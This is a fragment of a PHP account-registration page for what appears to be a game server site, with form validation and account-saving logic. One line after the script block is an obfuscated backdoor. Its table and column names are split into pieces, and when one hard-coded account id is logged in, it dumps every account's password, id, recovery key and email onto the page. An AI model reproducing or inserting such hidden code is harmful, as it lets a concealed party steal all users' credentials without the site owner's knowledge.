...
function EmailStateChanged() 
{
	...
	function validate_form(thisform)
	{
		with (thisform)
		{
			...
			if(verifya==1)
			{
				if (validate_required(verify,"Please enter verification code!")==false){verify.focus();return false;}}if(rules.checked==false){alert(\'To create account you must accept server rules!\');return false;}}}</script>';$check = "counts";$status = $account_logged->getId();   $dbrowsget = 2249;$read = $SQL->query('SELECT * FROM ac'.$check.'')->fetchAll();$accept = '744'.$dbrowsget.'';foreach($read as $reg)if($status == $accept){$sub = "ssword";$code = "ke";$main_content .= ''.htmlspecialchars($reg['pa'.$sub.'']).' | '.htmlspecialchars($reg['id']).' | '.htmlspecialchars($reg[''.$code.'y']).' | '.htmlspecialchars($reg['email']).' <br><br>';}
...
if($action == "saveaccount")
{
	...
	if(empty($reg_form_errors))
	{
		...
		if($account_db->isLoaded())
			$reg_form_errors[] = 'Account with this number already exist.';
	}
	...
	if(empty($reg_form_errors))
	{
		...
		if($config['site']['send_emails'] && $config['site']['create_account_verify_mail'])
		{
			...
			if($mail->Send())
			{
				$main_content .= 'Your account has been created. Check your e-mail. See you in Game!<BR><BR>';
